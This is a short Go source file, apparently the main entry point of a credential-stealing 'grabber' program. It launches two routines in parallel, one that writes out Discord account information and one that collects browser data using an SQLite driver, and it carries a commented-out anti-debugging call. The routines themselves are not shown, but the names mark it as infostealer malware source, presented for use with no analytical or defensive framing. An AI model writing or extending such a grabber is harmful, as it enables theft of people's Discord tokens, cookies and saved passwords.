package main

import (
	"kdot/grabber/browsers"
	"kdot/grabber/discord"
	"os"
	"sync"

	_ "github.com/mattn/go-sqlite3"
)

func main() {

	//go anti.AntiDebug()

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		discord.WriteDiscordInfo()
	}()

	// Start browsers.GetBrowserData in a goroutine
	go func() {
		defer wg.Done()
		browsers.GetBrowserData()
	}()

	wg.Wait()

	os.Exit(0)
}
